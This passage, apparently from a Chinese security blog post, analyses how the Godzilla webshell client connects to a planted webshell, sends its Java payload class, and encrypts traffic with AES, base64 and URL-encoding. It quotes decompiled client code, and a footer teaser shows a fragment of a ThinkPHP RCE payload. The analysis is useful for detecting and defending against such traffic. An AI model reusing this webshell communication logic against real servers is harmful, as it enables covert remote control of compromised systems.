+<p>实际上就是获取了一个随机的名字放入到<code>this.dynamicClassNameHashMap</code>对于classContent的具体值没用进行改变，所以JavaShell对象调用的getPayload()方法就是获取 <code>shell/java/assets/payload.classs</code> 类文件字节码,而<code>getCryption</code>方法就只是获取对应加密的对象了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Cryption <span class="title">getCryption</span><span class="params">(String payloadName, String crytionName)</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; cryptionClass = cryptionMap.get(crytionName);</span><br><span class="line">    <span class="keyword">if</span> (cryptionMap == <span class="keyword">null</span> || !((CryptionAnnotation) cryptionClass.getAnnotation(CryptionAnnotation.class)).payloadName().equals(payloadName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Cryption) cryptionClass.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就是调用<code>this.cryptionModel.init(this);</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.shell = context;</span><br><span class="line">    <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">    <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX();</span><br><span class="line">    <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">    String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));</span><br><span class="line">    <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher.init(<span class="number">1</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModel().getPayload();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">            <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取到传入该方法的ShellEntity对象的Http成员变量，这个ShellEntity保存着webshell的配置信息，可以直接对webshell发起请求，请求内容是通过<code>this.payload = this.shell.getPayloadModel().getPayload();</code>获取。</p>
+<p>对应的值继续往回跟，是在ShellEntity中的payloadModel成员变量获取，该成员变量赋值是在<code>initShellOpertion</code>方法中，通过<code>ApplicationContext.getPayload(this.payload);</code>获取，这里的getPayload和JavaShell对象的getPayload是不同的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Payload <span class="title">getPayload</span><span class="params">(String payloadName)</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; payloadClass = (Class)payloadMap.get(payloadName);</span><br><span class="line">    Payload payload = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (payloadClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = (Payload)payloadClass.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            Log.error(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的payloadModel其实就是JavaShell对象，具体情况上面分析了，就是读取<code>shell/java/assets/payload.classs</code>文件的内容，但是这个文件是字节码文件，他直接作为请求内容发送，应该是明文，但是实际抓的包是密文，继续跟进<code>this.http.sendHttpResponse(this.payload);</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> HttpResponse <span class="title">sendHttpResponse</span><span class="params">(<span class="keyword">byte</span>[] requestData)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sendHttpResponse(requestData, <span class="keyword">this</span>.shellContext.getConnTimeout(), <span class="keyword">this</span>.shellContext.getReadTimeout());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了他的重载函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> HttpResponse <span class="title">sendHttpResponse</span><span class="params">(Map&lt;String, String&gt; header, <span class="keyword">byte</span>[] requestData, <span class="keyword">int</span> connTimeOut, <span class="keyword">int</span> readTimeOut)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> i2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] requestData2 = <span class="keyword">this</span>.shellContext.getCryptionModel().encode(requestData);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.shellContext.isSendLRReqData()) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] leftData = <span class="keyword">this</span>.shellContext.getReqLeft().getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] rightData = <span class="keyword">this</span>.shellContext.getReqRight().getBytes();</span><br><span class="line">        <span class="keyword">if</span> (leftData.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            i = leftData.length;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Object concatArrays = functions.concatArrays(leftData, <span class="number">0</span>, i - <span class="number">1</span>, requestData2, <span class="number">0</span>, requestData2.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> length = (leftData.length + requestData2.length) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (rightData.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            i2 = rightData.length;</span><br><span class="line">        &#125;</span><br><span class="line">        requestData2 = (<span class="keyword">byte</span>[]) functions.concatArrays(concatArrays, <span class="number">0</span>, length, rightData, <span class="number">0</span>, i2 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> SendHttpConn(<span class="keyword">this</span>.shellContext.getUrl(), <span class="string">&quot;POST&quot;</span>, header, requestData2, connTimeOut, readTimeOut, <span class="keyword">this</span>.proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用了<code>byte[] requestData2 = this.shellContext.getCryptionModel().encode(requestData);</code>这里通过getCryptionModel()方法 获取到 ShellEnt下一步调用<code>this.cryptionModel.check()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是直接返回state成员变量，state在init方法中已经赋值为true了</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220621211840419.png" alt="image-20220621211840419"></p>
+<p>然后就是调用<code>this.payloadModel.init(this);</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity shellContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.shell = shellContext;</span><br><span class="line">    <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">    <span class="keyword">this</span>.encoding = Encoding.getEncoding(<span class="keyword">this</span>.shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设置了shellContext，http和编码，继续往下看，调用<code>this.payloadModel.test()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String codeString = <span class="keyword">new</span> String(evalFunc(<span class="keyword">null</span>, <span class="string">&quot;test&quot;</span>, <span class="keyword">new</span> ReqParameter()));</span><br><span class="line">    <span class="keyword">if</span> (codeString.trim().equals(<span class="string">&quot;ok&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.error(codeString);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了evalFunc，跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] evalFunc(String className, String funcName, ReqParameter praameter) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.trim().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        praameter.add(<span class="string">&quot;evalClassName&quot;</span>, getClassName(className));</span><br><span class="line">    &#125;</span><br><span class="line">    praameter.add(<span class="string">&quot;methodName&quot;</span>, funcName);</span><br><span class="line">    <span class="keyword">return</span> functions.gzipD(<span class="keyword">this</span>.http.sendHttpResponse(functions.gzipE(praameter.formatEx())).getResult());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>className传进来的时候是null，调用<code>praameter.add(&quot;methodName&quot;, funcName);</code>之后将parameter参数进行formatEx() 格式化处理后进行gzip压缩, 压缩完成后将数据通过sendHttpResponse方法向服务器发送请求，然后把结果返回进行gzip解压缩作为evalFunc的返回值，然后判断返回结果是否是ok，则返回true</p>
+<p>回到<code>core/ui/component/dialog/ShellSetting.java</code>，他往下调用了<code>this.shellContext.getPayloadModel().test()</code>,这语句在 this.shellContext.initShellOperation() 已经调用过一次，这就是在burpsuite中看到的第三次请求，和第二次请求是一样的</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220621212935881.png" alt="image-20220621212935881"></p>
+<p>这里差不多连接请求过程的问题就分析完了</p>
+<h2 id="加密过程分析"><a href="#加密过程分析" class="headerlink" title="加密过程分析"></a>加密过程分析</h2><p>上文说到流量是在<code>sendHttpResponse</code>方法中进行加密，调用了encode方法，因此这里直接去找对应Cryption的encode方法，找到<code>shells/cryptions/JavaAes/JavaAesBase64.java</code>类的encode方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64Encode(<span class="keyword">this</span>.encodeCipher.doFinal(data)))).getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加密过程一目了然，是先aes加密然后base64编码然后url编码，所以对应解密的过程就是先url解码然后base64解码然后aes解密。</p>
+
+  </div>
+   
+   
+
+  
+  <div class="post-copyright">
+    <div class="post-copyright-icon"></div>
+      <div class="post-copyright-author">
+          <span class="post-copyright-meta">文章作者: </span>
+            <span class="post-copyright-info">
+              <a href="mailto:1444440144@qq.com" >ch1e</a>
+            </span>
+      </div>
+      <div class="post-copyright-type">
+          <span class="post-copyright-meta">文章链接: </span>
+            <span class="post-copyright-info">
+              <a href="https://ch1e.cn/2022/06/21/godzilla/" >https://ch1e.cn/2022/06/21/godzilla/</a>
+            </span>
+      </div><div class="post-copyright-notice">
+          <span class="post-copyright-meta">版权声明: </span>
+            <span class="post-copyright-info">本博客所有文章除特别声明外，均采用
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/ " target="_blank" >
+                  CC BY-NC-SA 4.0 </a> 许可协议。转载请注明来自
+              <a href="https://ch1e.cn/2022/06/21/godzilla/" target="_blank" >ch1e</a>
+              ！</span>
+      </div>
+  </div>
+  
+
+
+ 
+
+  
+    <div class="post-tag">
+        <span>
+            <i class="fa fa-tag"></i>
+             
+            <a href="tags/web安全/"><span>web安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/代码审计/"><span>代码审计</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/Java安全/"><span>Java安全</span></a>
+                
+            
+        </span>
+    </div>
+  
+
+
+
+
+<div class="pagination-post">
+    
+    
+    <a href="/2022/05/31/tp5xrce/">
+      <div class="next-title">Thinkphp5.x RCE<i class="fas fa-chevron-right"></i></div>
+      <div class="next-desc">漏洞分析环境:
+thinkphp5.0.20+php7.3.4+apache+phpstorm
+Payload：
+5.0.x
+1234?s=index/think\config/get&amp;amp;...</div>
+    </a>
+    
+</div>
+
+</article>
+ 
+
+
+  <div id="toc-wrap">
+    <div id="toc">
+      <div class="toc-title">
+        <div>
+          目录
+            <span class="num">0%</span>
+        </div>
+        <progress class="progress" value="0" max="100"></progress>
+      </div>
+      <div class="toc-list">
+         
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E5%88%86%E6%9E%90"><span class="toc-text">Webshell文件生成分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">连接请求过程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">加密过程分析</span></a></li></ol></li></ol>
+      </div>
+    </div>
+  </div>
+
+
+        </main>
+        <section id="rightside">
+    
+    <div class="rightside-item">
+        
+        
+         
+        
+        
+            <a id="open-toc" title="目录">
+                <i class="fas fa-list-ul"></i>
+            </a>
+        
+         
+         
+        <a href="javascript:(0)" id="darkmode" title="深色/浅色 ">
+            <i class="fas fa-moon"></i>
+        </a>
+         
+        
+        <a href="#" title="回到顶部">
+            <i class="fas fa-arrow-up"></i>
+        </a>
+    </div>
+</section>
+         
+
+<footer class="footer" id="footer">
+    <div class="copyright">
+      &copy; 2020 - 2022
+        <i class="fas fa-fan"></i>
+        ch1e
+    </div>
+    <div class="framework-info">
+        <span>框架 </span>
+        <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="footer-separator">|</span>
+        <span>主题 </span>
+        <a href="https://github.com/lete114/hexo-theme-MengD" target="_blank">MengD.(萌典) </a>
+    </div>
+    
+    <div class="custom-text">我相信我可以，但我一直在路上，所以我有无限的可能！！</div>
+</footer>
+    </div>
+    <div id="mask" onclick="closeAll()"></div>
+    
+    <div class="script">
+        <script src="/js/main.js"></script>
+        
+
+
+<script src="/js/lazyload.js"></script>
+
+
+    
+
+
+        
+    <script>
+        getScript('https://cdn.jsdelivr.net/npm/pjax/pjax.min.js',LoadPjax)
+        function LoadPjax() {
+            var pjax = new Pjax({
+                selectors: [
+                    'head title',
+                    'head meta[name="keywords"]',
+                    'head meta[name="description"]',
+                    'main',
+                    '#rightside'
+                ],
+                cache: true,
+                cacheBust: false
+            });
+        }
+
+        // 清除时间
+        var timer = null;
+        // 执行进度条
+        function ProgressStart() {
+            // 设置初始进度
+            var progress = 10;
+            // 创建进度条 及 css样式
+            var div = document.createElement('div');
+            div.className = 'pjax-progress';
+            document.body.prepend(div);
+            // 定义随机数最大值最小值
+            var max = 10, mini = 3;
+            var result = max - mini;
+            // 清除
+            clearInterval(timer);
+            // 0.5秒内累加进度
+            timer = setInterval(function () {
+                // 随机数
+                var num = parseInt(Math.random() * result);
+                var randomResult = num + mini;
+                // 累加
+                progress += randomResult
+                document.getElementsByClassName('pjax-progress')[0].style.width = progress + '%';
+                // 当进度达到95%时停止
+                if (progress > 95) progress = 95
+            }, 500)
+        }
+        // 加载进度条加载完毕
+        function ProgressFinish() {
+            clearInterval(timer);
+            // 页面加载完毕后进度100% 并在0.7秒后删除
+            var progress = document.getElementsByClassName('pjax-progress');
+            progress[0].style.width = '100%';
+            timer = setTimeout(function () {
+                progress[0].parentNode.removeChild(progress[0])
+            }, 700);
+        }
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+            // 执行进度条
+            ProgressStart()
+        });
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+
+            // 加载进度条加载完毕
+            ProgressFinish()
+            // 执行所有方法
+            exeAllFn()
+
+            
+                // 图片懒加载
+                ImgLazyLoad('body img[data-img]', 'data-img')
+            
+
+
+            document.querySelectorAll('script[data-pjax]').forEach(item => {
+                const newScript = document.createElement('script')
+                const content = item.text || item.textContent || item.innerHTML || ''
+                Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+                newScript.appendChild(document.createTextNode(content))
+                item.parentNode.replaceChild(newScript, item)
+            })
+        });
+
+        // Pjax请求错误时，跳转到404页面
+        document.addEventListener('pjax:error', (err) => {
+            if (err.request.status === 404) {
+                pjax.loadUrl('/404.html')
+            }
+        })
+    </script>
+
+    </div>
+</body>
+
+</html>
